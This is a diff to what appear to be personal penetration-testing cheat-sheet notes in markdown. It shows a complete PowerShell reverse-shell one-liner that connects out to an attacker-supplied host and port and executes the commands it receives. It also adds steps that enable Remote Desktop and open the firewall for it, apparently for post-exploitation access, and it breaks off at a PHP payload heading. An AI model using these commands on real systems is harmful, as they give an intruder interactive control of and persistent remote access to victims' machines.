@@ -85,8 +85,20 @@ PS
 ```powershell
 powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('$hip',$hport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
-
-
+##### Enable RDP
+1. Enable Remote Desktop connections
+```powershell
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0
+```
+2. Enable Network Level Authentication
+```powershell
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -Value 1
+```
+3. Enable Windows firewall rules to allow incoming RDP
+```powershell
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+```
+![[Pasted image 20230928075535.png]]
 ## Linux
 PHP (`php -r ''` or `<?php payload ?>)
 ```php
